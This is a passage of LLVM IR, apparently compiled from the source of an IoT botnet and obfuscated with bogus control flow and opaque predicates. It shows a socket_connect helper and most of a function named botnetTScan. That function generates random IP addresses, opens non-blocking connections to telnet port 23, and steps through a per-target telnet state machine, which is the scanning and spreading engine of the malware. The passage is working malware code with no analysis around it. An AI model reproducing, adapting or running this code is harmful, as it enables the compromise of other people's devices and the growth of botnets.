  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = load i32, i32* @x.75
  %4 = load i32, i32* @y.76
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i16, align 2
  %14 = alloca %struct.hostent*, align 8
  %15 = alloca %struct.sockaddr_in, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i16 %1, i16* %13, align 2
  store i32 1, i32* %16, align 4
  %18 = load i8*, i8** %12, align 8
  %19 = call %struct.hostent* @gethostbyname(i8* %18)
  store %struct.hostent* %19, %struct.hostent** %14, align 8
  %20 = icmp eq %struct.hostent* %19, null
  %21 = load i32, i32* @x.75
  %22 = load i32, i32* @y.76
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %20, label %29, label %30

; <label>:29:                                     ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %61

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load %struct.hostent*, %struct.hostent** %14, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 4
  %33 = load i8**, i8*** %32, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 0
  %35 = load i8*, i8** %34, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  %37 = bitcast %struct.in_addr* %36 to i8*
  %38 = load %struct.hostent*, %struct.hostent** %14, align 8
  %39 = getelementptr inbounds %struct.hostent, %struct.hostent* %38, i32 0, i32 3
  %40 = load i32, i32* %39, align 4
  %41 = sext i32 %40 to i64
  call void @bcopy(i8* %35, i8* %37, i64 %41) #3
  %42 = load i16, i16* %13, align 2
  %43 = call zeroext i16 @htons(i16 zeroext %42) #10
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  store i16 %43, i16* %44, align 2
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  store i16 2, i16* %45, align 4
  %46 = call i32 @socket(i32 2, i32 1, i32 6) #3
  store i32 %46, i32* %17, align 4
  %47 = load i32, i32* %17, align 4
  %48 = bitcast i32* %16 to i8*
  %49 = call i32 @setsockopt(i32 %47, i32 6, i32 1, i8* %48, i32 4) #3
  %50 = load i32, i32* %17, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %30
  store i32 0, i32* %11, align 4
  br label %61

; <label>:53:                                     ; preds = %30
  %54 = load i32, i32* %17, align 4
  %55 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %56 = call i32 @connect(i32 %54, %struct.sockaddr* %55, i32 16)
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %53
  store i32 0, i32* %11, align 4
  br label %61

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %17, align 4
  store i32 %60, i32* %11, align 4
  br label %61

; <label>:61:                                     ; preds = %59, %58, %52, %29
  %62 = load i32, i32* @x.75
  %63 = load i32, i32* @y.76
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = load i32, i32* %11, align 4
  %71 = load i32, i32* @x.75
  %72 = load i32, i32* @y.76
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %70

originalBBalteredBB:                              ; preds = %originalBB, %2
  %79 = alloca i32, align 4
  %80 = alloca i8*, align 8
  %81 = alloca i16, align 2
  %82 = alloca %struct.hostent*, align 8
  %83 = alloca %struct.sockaddr_in, align 4
  %84 = alloca i32, align 4
  %85 = alloca i32, align 4
  store i8* %0, i8** %80, align 8
  store i16 %1, i16* %81, align 2
  store i32 1, i32* %84, align 4
  %86 = load i8*, i8** %80, align 8
  %87 = call %struct.hostent* @gethostbyname(i8* %86)
  store %struct.hostent* %87, %struct.hostent** %82, align 8
  %88 = icmp eq %struct.hostent* %87, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %89 = load i32, i32* %11, align 4
  br label %originalBB1
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @botnetTScan(i32, i32) #0 {
  %3 = load i32, i32* @x.77
  %4 = load i32, i32* @y.78
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [128 x i8], align 16
  %18 = alloca i8, align 1
  %19 = alloca i32, align 4
  %20 = alloca %struct.fd_set, align 8
  %21 = alloca %struct.timeval, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca [256 x i8], align 16
  %25 = alloca i8*, align 8
  %26 = alloca %struct.sockaddr_in, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  store i32 %1, i32* %12, align 4
  %31 = load i32, i32* %12, align 4
  store i32 %31, i32* %19, align 4
  %32 = call i64 @time(i64* null) #3
  %33 = call i32 @rand_cmwc()
  %34 = zext i32 %33 to i64
  %35 = xor i64 %32, %34
  %36 = trunc i64 %35 to i32
  call void @srand(i32 %36) #3
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 0
  store i16 2, i16* %37, align 4
  %38 = call zeroext i16 @htons(i16 zeroext 23) #10
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 3
  %41 = getelementptr inbounds [8 x i8], [8 x i8]* %40, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 8, i32 4, i1 false)
  %42 = call noalias i8* @malloc(i64 1025) #3
  store i8* %42, i8** %25, align 8
  %43 = load i8*, i8** %25, align 8
  call void @llvm.memset.p0i8.i64(i8* %43, i8 0, i64 1025, i32 1, i1 false)
  %44 = load i32, i32* %19, align 4
  %45 = zext i32 %44 to i64
  %46 = call i8* @llvm.stacksave()
  store i8* %46, i8** %27, align 8
  %47 = alloca %struct.telstate_t, i64 %45, align 16
  %48 = load i32, i32* %19, align 4
  %49 = zext i32 %48 to i64
  %50 = alloca i32, i64 %49, align 16
  %51 = bitcast %struct.telstate_t* %47 to i8*
  %52 = load i32, i32* %19, align 4
  %53 = sext i32 %52 to i64
  %54 = mul i64 %53, 5
  call void @llvm.memset.p0i8.i64(i8* %51, i8 0, i64 %54, i32 16, i1 false)
  store i32 0, i32* %13, align 4
  %55 = load i32, i32* @x.77
  %56 = load i32, i32* @y.78
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %63

; <label>:63:                                     ; preds = %113, %originalBBpart2
  %64 = load i32, i32* @x.77
  %65 = load i32, i32* @y.78
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %63
  %72 = load i32, i32* %13, align 4
  %73 = load i32, i32* %19, align 4
  %74 = icmp slt i32 %72, %73
  %75 = load i32, i32* @x.77
  %76 = load i32, i32* @y.78
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br i1 %74, label %83, label %116

; <label>:83:                                     ; preds = %originalBBpart215
  %84 = load i32, i32* @x.77
  %85 = load i32, i32* @y.78
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %83
  %92 = load i32, i32* %13, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %93
  %95 = bitcast %struct.telstate_t* %94 to i8*
  call void @llvm.memset.p0i8.i64(i8* %95, i8 0, i64 32, i32 16, i1 false)
  %96 = load i32, i32* %13, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %97
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %98, i32 0, i32 3
  store i8 1, i8* %99, align 1
  %100 = load i8*, i8** %25, align 8
  %101 = load i32, i32* %13, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %102
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %103, i32 0, i32 9
  store i8* %100, i8** %104, align 8
  %105 = load i32, i32* @x.77
  %106 = load i32, i32* @y.78
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %113

; <label>:113:                                    ; preds = %originalBBpart219
  %114 = load i32, i32* %13, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %13, align 4
  br label %63

; <label>:116:                                    ; preds = %originalBBpart215
  %117 = load i32, i32* @x.77
  %118 = load i32, i32* @y.78
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %116
  store i32 0, i32* %15, align 4
  %125 = load i32, i32* @x.77
  %126 = load i32, i32* @y.78
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %133

; <label>:133:                                    ; preds = %140, %originalBBpart223
  %134 = load i32, i32* %15, align 4
  %135 = add nsw i32 %134, 1
  store i32 %135, i32* %15, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %136
  %138 = load i8*, i8** %137, align 8
  %139 = icmp ne i8* %138, null
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %133
  br label %133

; <label>:141:                                    ; preds = %133
  %142 = load i32, i32* @x.77
  %143 = load i32, i32* @y.78
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %141
  %150 = load i32, i32* @x.77
  %151 = load i32, i32* @y.78
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %158

; <label>:158:                                    ; preds = %1111, %originalBBpart227
  br label %159

; <label>:159:                                    ; preds = %158
  store i32 0, i32* %13, align 4
  br label %160

; <label>:160:                                    ; preds = %1108, %159
  %161 = load i32, i32* %13, align 4
  %162 = load i32, i32* %19, align 4
  %163 = icmp slt i32 %161, %162
  br i1 %163, label %164, label %1111

; <label>:164:                                    ; preds = %160
  %165 = load i32, i32* %13, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %166
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %167, i32 0, i32 7
  %169 = load i32, i32* %168, align 16
  %170 = icmp eq i32 %169, 0
  br i1 %170, label %171, label %178

; <label>:171:                                    ; preds = %164
  %172 = call i64 @time(i64* null) #3
  %173 = trunc i64 %172 to i32
  %174 = load i32, i32* %13, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %175
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %176, i32 0, i32 7
  store i32 %173, i32* %177, align 16
  br label %178

; <label>:178:                                    ; preds = %171, %164
  %179 = load i32, i32* %13, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %180
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %181, i32 0, i32 2
  %183 = load i8, i8* %182, align 8
  %184 = zext i8 %183 to i32
  switch i32 %184, label %1107 [
    i32 0, label %185
    i32 1, label %403
    i32 2, label %518
    i32 3, label %596
    i32 4, label %641
    i32 5, label %751
    i32 6, label %800
    i32 7, label %964
  ]

; <label>:185:                                    ; preds = %178
  %186 = load i32, i32* @x.77
  %187 = load i32, i32* @y.78
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %185
  %194 = load i32, i32* %13, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %195
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %196, i32 0, i32 3
  %198 = load i8, i8* %197, align 1
  %199 = zext i8 %198 to i32
  %200 = icmp eq i32 %199, 1
  %201 = load i32, i32* @x.77
  %202 = load i32, i32* @y.78
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %200, label %209, label %229

; <label>:209:                                    ; preds = %originalBBpart231
  %210 = load i32, i32* %13, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %211
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %212, i32 0, i32 9
  %214 = load i8*, i8** %213, align 8
  store i8* %214, i8** %28, align 8
  %215 = load i32, i32* %13, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %216
  %218 = bitcast %struct.telstate_t* %217 to i8*
  call void @llvm.memset.p0i8.i64(i8* %218, i8 0, i64 32, i32 16, i1 false)
  %219 = load i8*, i8** %28, align 8
  %220 = load i32, i32* %13, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %221
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %222, i32 0, i32 9
  store i8* %219, i8** %223, align 8
  %224 = call i32 @GIP()
  %225 = load i32, i32* %13, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %226
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %227, i32 0, i32 1
  store i32 %224, i32* %228, align 4
  br label %327

; <label>:229:                                    ; preds = %originalBBpart231
  %230 = load i32, i32* %13, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %231
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %232, i32 0, i32 3
  %234 = load i8, i8* %233, align 1
  %235 = zext i8 %234 to i32
  %236 = icmp eq i32 %235, 0
  br i1 %236, label %237, label %326

; <label>:237:                                    ; preds = %229
  %238 = load i32, i32* %13, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %239
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %240, i32 0, i32 5
  %242 = load i8, i8* %241, align 1
  %243 = add i8 %242, 1
  store i8 %243, i8* %241, align 1
  %244 = load i32, i32* %13, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %245
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %246, i32 0, i32 4
  %248 = load i8, i8* %247, align 2
  %249 = add i8 %248, 1
  store i8 %249, i8* %247, align 2
  %250 = load i32, i32* %13, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %251
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %252, i32 0, i32 5
  %254 = load i8, i8* %253, align 1
  %255 = zext i8 %254 to i64
  %256 = mul nuw i64 4, %49
  %257 = udiv i64 %256, 8
  %258 = icmp eq i64 %255, %257
  br i1 %258, label %259, label %264

; <label>:259:                                    ; preds = %237
  %260 = load i32, i32* %13, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %261
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %262, i32 0, i32 3
  store i8 1, i8* %263, align 1
  br label %1108

; <label>:264:                                    ; preds = %237
  %265 = load i32, i32* @x.77
  %266 = load i32, i32* @y.78
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %264
  %273 = load i32, i32* %13, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %274
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %275, i32 0, i32 4
  %277 = load i8, i8* %276, align 2
  %278 = zext i8 %277 to i64
  %279 = icmp eq i64 %278, 0
  %280 = load i32, i32* @x.77
  %281 = load i32, i32* @y.78
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %279, label %288, label %309

; <label>:288:                                    ; preds = %originalBBpart235
  %289 = load i32, i32* @x.77
  %290 = load i32, i32* @y.78
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %288
  %297 = load i32, i32* %13, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %298
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %299, i32 0, i32 3
  store i8 1, i8* %300, align 1
  %301 = load i32, i32* @x.77
  %302 = load i32, i32* @y.78
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %1108

; <label>:309:                                    ; preds = %originalBBpart235
  %310 = load i32, i32* @x.77
  %311 = load i32, i32* @y.78
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %309
  %318 = load i32, i32* @x.77
  %319 = load i32, i32* @y.78
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %326

; <label>:326:                                    ; preds = %originalBBpart243, %229
  br label %327

; <label>:327:                                    ; preds = %326, %209
  %328 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 0
  store i16 2, i16* %328, align 4
  %329 = call zeroext i16 @htons(i16 zeroext 23) #10
  %330 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 1
  store i16 %329, i16* %330, align 2
  %331 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 3
  %332 = getelementptr inbounds [8 x i8], [8 x i8]* %331, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %332, i8 0, i64 8, i32 4, i1 false)
  %333 = load i32, i32* %13, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %334
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %335, i32 0, i32 1
  %337 = load i32, i32* %336, align 4
  %338 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %26, i32 0, i32 2
  %339 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %338, i32 0, i32 0
  store i32 %337, i32* %339, align 4
  %340 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %341 = load i32, i32* %13, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %342
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %343, i32 0, i32 0
  store i32 %340, i32* %344, align 16
  %345 = load i32, i32* %13, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %346
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %347, i32 0, i32 0
  %349 = load i32, i32* %348, align 16
  %350 = icmp eq i32 %349, -1
  br i1 %350, label %351, label %352

; <label>:351:                                    ; preds = %327
  br label %1108

; <label>:352:                                    ; preds = %327
  %353 = load i32, i32* %13, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %354
  %356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %355, i32 0, i32 0
  %357 = load i32, i32* %356, align 16
  %358 = load i32, i32* %13, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %359
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %360, i32 0, i32 0
  %362 = load i32, i32* %361, align 16
  %363 = call i32 (i32, i32, ...) @fcntl(i32 %362, i32 3, i8* null)
  %364 = or i32 %363, 2048
  %365 = call i32 (i32, i32, ...) @fcntl(i32 %357, i32 4, i32 %364)
  %366 = load i32, i32* %13, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 0
  %370 = load i32, i32* %369, align 16
  %371 = bitcast %struct.sockaddr_in* %26 to %struct.sockaddr*
  %372 = call i32 @connect(i32 %370, %struct.sockaddr* %371, i32 16)
  %373 = icmp eq i32 %372, -1
  br i1 %373, label %374, label %398

; <label>:374:                                    ; preds = %352
  %375 = load i32, i32* @x.77
  %376 = load i32, i32* @y.78
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %374
  %383 = call i32* @__errno_location() #10
  %384 = load i32, i32* %383, align 4
  %385 = icmp ne i32 %384, 115
  %386 = load i32, i32* @x.77
  %387 = load i32, i32* @y.78
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %385, label %394, label %398

; <label>:394:                                    ; preds = %originalBBpart247
  %395 = load i32, i32* %13, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %396
  call void @reset_telstate(%struct.telstate_t* %397)
  br label %402

; <label>:398:                                    ; preds = %originalBBpart247, %352
  %399 = load i32, i32* %13, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %400
  call void @advance_state(%struct.telstate_t* %401, i32 1)
  br label %402

; <label>:402:                                    ; preds = %398, %394
  br label %1107

; <label>:403:                                    ; preds = %178
  br label %404

; <label>:404:                                    ; preds = %403
  %405 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %20, i32 0, i32 0
  %406 = getelementptr inbounds [16 x i64], [16 x i64]* %405, i64 0, i64 0
  %407 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %406) #3, !srcloc !6
  %408 = extractvalue { i64, i64* } %407, 0
  %409 = extractvalue { i64, i64* } %407, 1
  %410 = trunc i64 %408 to i32
  store i32 %410, i32* %29, align 4
  %411 = ptrtoint i64* %409 to i64
  %412 = trunc i64 %411 to i32
  store i32 %412, i32* %30, align 4
  br label %413

; <label>:413:                                    ; preds = %404
  br label %414

; <label>:414:                                    ; preds = %413
  %415 = load i32, i32* %13, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %416
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %417, i32 0, i32 0
  %419 = load i32, i32* %418, align 16
  %420 = srem i32 %419, 64
  %421 = zext i32 %420 to i64
  %422 = shl i64 1, %421
  %423 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %20, i32 0, i32 0
  %424 = load i32, i32* %13, align 4
  %425 = sext i32 %424 to i64
